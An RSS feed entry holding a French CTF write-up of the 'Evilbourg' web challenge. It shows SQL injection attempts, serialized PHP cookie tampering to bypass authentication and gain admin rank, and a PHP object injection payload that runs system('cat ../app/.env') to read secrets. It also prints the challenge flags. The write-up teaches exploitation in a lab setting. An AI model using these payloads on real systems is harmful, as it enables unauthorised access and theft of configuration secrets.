<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Deilyora</title>
		<link>https://deilyora.github.io/posts/</link>
		<description>Recent content in Posts on Deilyora</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Wed, 05 Jun 2019 10:06:59 +0200</lastBuildDate>
		<atom:link href="https://deilyora.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>INTERIUT - WEB : Evilbourg</title>
			<link>https://deilyora.github.io/posts/evilbourg/</link>
			<pubDate>Wed, 05 Jun 2019 10:06:59 +0200</pubDate>
			
			<guid>https://deilyora.github.io/posts/evilbourg/</guid>
			<description>Le CTF INTERIUT se déroule à l&amp;rsquo;ENSIBS en juin, il est réservé aux niveaux DUT / BTS. Le challenge Evilbourg se déroule en 3 parties, crescendo.
TL;DR Modification de cookie pour bypasser une authentification, suivi d&amp;rsquo;une injection d&amp;rsquo;objet PHP serializé pour executer des commandes systèmes.
Ce chall et writeup ont été fait avec Cabir.
Partie 1 : Nous arrivons sur l&amp;rsquo;interface du challenge. 
Premier reflexe pour ma part je vais dans l&amp;rsquo;onglet connexion.</description>
			<content type="html"><![CDATA[

<p>Le CTF INTERIUT se déroule à l&rsquo;ENSIBS en juin, il est réservé aux niveaux DUT / BTS.
Le challenge Evilbourg se déroule en 3 parties, <strong>crescendo</strong>.</p>

<h2 id="span-style-color-3cb371-tl-dr-span"><span style="color:#3cb371;">TL;DR</span></h2>

<p>Modification de cookie pour bypasser une authentification, suivi d&rsquo;une injection d&rsquo;objet PHP serializé
pour executer des commandes systèmes.</p>

<p>Ce chall et writeup ont été fait avec <a href="https://cabir.fr" target="_blank">Cabir</a>.</p>

<h2 id="span-style-color-3cb371-partie-1-span"><span style="color:#3cb371;">Partie 1 :</span></h2>

<p>Nous arrivons sur l&rsquo;interface du challenge.
<center><img src="/img/writeups/evilbourg/accueil.png" alt="accueil" /></center></p>

<p>Premier reflexe pour ma part je vais dans l&rsquo;onglet connexion.
<center><img src="/img/writeups/evilbourg/connexion.png" alt="connexion" /></center></p>

<p>On essaye rapidement un payload extremement compliqué :</p>

<pre><code>admin' OR 1=1--
ou
admin' OR 1=1#
</code></pre>

<p>Rien ne ce passe, il n&rsquo;y a pas de réaction de la part du serveur.</p>

<p>On décide d&rsquo;aller voir les cookies <a href="https://addons.mozilla.org/de/firefox/addon/a-cookie-manager/" target="_blank">(avec l&rsquo;extension CookieManager sur Firefox)</a>.</p>

<p>On le décode avec <a href="https://www.urlencoder.org/" target="_blank">URL DECODE</a> :</p>

<pre><code>a:2:{s:11:&quot;Utilisateur&quot;;i:0;s:10:&quot;slim.flash&quot;;a:0:{}}
</code></pre>

<p>On remarque que Utilisateur a un attribut integer : <code>i:0</code>.
On le passe à <code>i:1</code>, et on rafraichit la page.</p>

<p>On URL encode le cookie pour pouvoir l&rsquo;insérer avec <a href="https://www.urlencoder.org/" target="_blank">URL ENCODE</a> :</p>

<pre><code>a%3A2%3A%7Bs%3A11%3A%22Utilisateur%22%3Bi%3A0%3Bs%3A10%3A%22slim.flash%22%3Ba%3A0%3A%7B%7D%7D
</code></pre>

<p>On rafraichit la page, nous sommes connectés.
<center><img src="/img/writeups/evilbourg/logged.png" alt="logged" /></center></p>

<p>On a accès à un Gitlab sur lequel on trouve dans le README.md :
<center><img src="/img/writeups/evilbourg/flag1.png" alt="firstflag" /></center></p>

<p><center><code>FLAG IS : H2G2{N0_S4F3_T0ken}</code></center></p>

<h2 id="span-style-color-3cb371-partie-2-span"><span style="color:#3cb371;">Partie 2 :</span></h2>

<p>On obtient un acces à un Gitlab. On cherche le fichier <code>.env</code>.
A l&rsquo;intérieur on trouve deux identifiants :
<center><img src="/img/writeups/evilbourg/identifiant.png" alt="identifiant" /></center>
Mais rien de ce côté là.</p>

<p>Dans le dossier var, ont trouve des fichiers de logs.
Dans les erreurs, il y a un appel a un fichier qui attire notre attention : <strong>Confidential.php.</strong></p>

<pre><code>&lt;?php

namespace App\Controller;


use App\Service\EnvService;
use App\Service\SystemCall;
use App\Service\UserRankService;

class Confidential
{
    public function confidential($app)
    {
        $userRankService = new UserRankService();
        $rank = $userRankService-&gt;getSessionRank();

        $envService = new EnvService();

        $deuxiemeFlag = $envService-&gt;getEnv('DEUXIEME_FLAG');
        $notesHacker = $envService-&gt;getEnv('NOTES_HACKER');
        $systemCall = new SystemCall('system(&quot;ls -a ../app&quot;);');

        if($rank === UserRankService::ADMIN_RANK){
            $app-&gt;render('front/confidential.twig', array('admin' =&gt; $rank, 'systemCall' =&gt; $systemCall,
                'deuxiemeFlag' =&gt; $deuxiemeFlag, 'notesHacker' =&gt; $notesHacker));
        }else {
            $app-&gt;redirect('/connexion', '/connexion', 301);
        }

    }
}
</code></pre>

<p>Dans le controller Confidential.php, on remarque un appel à : <code>if($rank === UserRankService::ADMIN_RANK)</code>
Consultons le controller <code>UserRankService.php</code></p>

<pre><code>&lt;?php
/**
 * Created by PhpStorm.
 * User: MATASSE
 * Date: 23/02/2019
 * Time: 13:22
 */

namespace App\Service;


class UserRankService
{

    public const ADMIN_RANK = '4dmin_H3Re!';
    public const ADMIN_TEXT= 'here you are!';
    public const USER_RANK= 'Utilisateur';
    public const USER_TEXT= 1;

    function getSessionRank(){

        if(isset($_SESSION[UserRankService::ADMIN_RANK])){
            if($_SESSION[UserRankService::ADMIN_RANK] === UserRankService::ADMIN_TEXT){
                return UserRankService::ADMIN_RANK;
            }
        }

        if(isset($_SESSION[UserRankService::USER_RANK])){
            if($_SESSION[UserRankService::USER_RANK] === UserRankService::USER_TEXT){
                return UserRankService::USER_RANK;
            }
        }

        return 'Non connecté';

    }

}

</code></pre>

<p>On reconnait notre ancien cookie avec l&rsquo;object serializé : <code>Utilisateur et 1</code>.
Du coup on modifie le cookie en ajoutant <code>4dmin_H3Re et here you are!</code> (d&rsquo;après la condition if précedente).
Ce qui ressemble à ca :</p>

<pre><code>a:3:{s:11:&quot;4dmin_H3Re!&quot;;s:13:&quot;here you are!&quot;;s:11:&quot;Utilisateur&quot;;i:1;s:10:&quot;slim.flash&quot;;a:0:{}}
</code></pre>

<p>On <a href="https://www.urlencoder.org/" target="_blank">URL ENCODE</a> le cookie pour pouvoir l&rsquo;insérer</p>

<pre><code>a%3A3%3A%7Bs%3A11%3A%224dmin_H3Re%21%22%3Bs%3A13%3A%22here%20you%20are%21%22%3Bs%3A11%3A%22Utilisateur%22%3Bi%3A1%3Bs%3A10%3A%22slim.flash%22%3Ba%3A0%3A%7B%7D%7D
</code></pre>

<p>Modification de cookie et :</p>

<p><center><img src="/img/writeups/evilbourg/flag2.png" alt="flag2" /></center></p>

<p><center><code>FLAG IS : H2G2{Publ1c_G1t_15_B4D}</code></center></p>

<h2 id="span-style-color-3cb371-partie-3-span"><span style="color:#3cb371;">Partie 3 :</span></h2>

<p>Dans les notes laissées par le hacker, il nous est indiqué que le site est vulnéralble à la CVE-2015-2171, mais qu&rsquo;il n&rsquo;y a pas de POC en ligne.
Il est également précisé que la documentation OWASP sera très utile.</p>

<p>On cherche donc des informations sur la CVE, et en effet on ne trouve rien de concret, à part le type de vulnérabilité (PHP Object Injection) et un lien vers le site d&rsquo;<a href="https://www.owasp.org/index.php/PHP_Object_Injection" target="_blank">OWASP</a> sur la vulnérabilité.</p>

<p>L&rsquo;exploitation de la vulnérabilité consiste enfaite a injecter un objet PHP grâce à la méthode magique (qui est exploitable) <code>__wakeup()</code>.</p>

<p>Après les notes du hacker, on pouvait voir sur la page le retour d&rsquo;un <code>ls</code>. En regardant le code source de Confidential.php, on voit en effet l&rsquo;appel à une classe SystemCall, avec en paramètre du constructeur un appel à la méthode <code>system</code> de PHP pour exécuter le <code>ls</code>.</p>

<pre><code>&lt;?php

namespace App\Controller;


use App\Service\EnvService;
use App\Service\SystemCall;
use App\Service\UserRankService;

class Confidential
{
    public function confidential($app)
    {
        $userRankService = new UserRankService();
        $rank = $userRankService-&gt;getSessionRank();

        $envService = new EnvService();

        $deuxiemeFlag = $envService-&gt;getEnv('DEUXIEME_FLAG');
        $notesHacker = $envService-&gt;getEnv('NOTES_HACKER');
        $systemCall = new SystemCall('system(&quot;ls -a ../app&quot;);');

        if($rank === UserRankService::ADMIN_RANK){
            $app-&gt;render('front/confidential.twig', array('admin' =&gt; $rank, 'systemCall' =&gt; $systemCall,
                'deuxiemeFlag' =&gt; $deuxiemeFlag, 'notesHacker' =&gt; $notesHacker));
        }else {
            $app-&gt;redirect('/connexion', '/connexion', 301);
        }

    }
}
</code></pre>

<p>On se dit donc qu&rsquo;il va falloir injecter un objet de type <code>SystemCall</code>, afin de pouvoir passer nos propres commandes.</p>

<p>Et ça tombe bien, on a justement le code source de la classe <code>SystemCall</code> sur le Gitlab.</p>

<p>Pour sérialiser notre objet nous avons utilisé <a href="http://sandbox.onlinephpfunctions.com/" target="_blank">PHP Sandbox</a>.
On y insère notre classe SystemCall à sérialiser pour pouvoir lire le fichier <code>.env</code> ainsi que un print(serialize()) pour sérialiser notre objet :</p>

<pre><code>&lt;?php

namespace App\Service;

class SystemCall
{
    public $hook;
    public $result;

    function construct($hook)
    {
        $this-&gt;hook = $hook;
    }

    function wakeup()
    {
        $this-&gt;result = eval($this-&gt;hook);
    }

    function call()
    {
        $this-&gt;__wakeup();
    }
}

print serialize(new SystemCall('system(&quot;cat ../app/.env&quot;)')).&quot;\n&quot;;
print &quot;---------------------------------------------\n&quot;;
print urlencode(serialize(new SystemCall('system(&quot;cat ../app/.env&quot;)')));
?&gt;
</code></pre>

<p>On récupère donc notre objet sérialisé, de cette forme ( on oublie pas le <code>;</code> pour les méthodes PHP :D ) car sinon :
<center><img src="/img/writeups/evilbourg/errorflag3.png" alt="errorflag3" /></center></p>

<pre><code>O:22:&quot;App\Service\SystemCall&quot;:2:{s:4:&quot;hook&quot;;s:26:&quot;system(&quot;cat ../app/.env&quot;);&quot;;s:6:&quot;result&quot;;N;}
</code></pre>

<p>Il ne reste plus qu&rsquo;à injecter l&rsquo;objet. Il sera injecté au moment de la désérialisation. On le rajoute donc devant notre cookie d&rsquo;authentification, on encode et
on récupére le <code>.env</code> de production :</p>

<p><center><img src="/img/writeups/evilbourg/flag3.png" alt="flag3" /></center></p>

<p><center><code>FLAG IS : H2G2{5L1M_15_Th3_W4Y}</code></center></p>
]]></content>
		</item>
		
	</channel>
</rss>
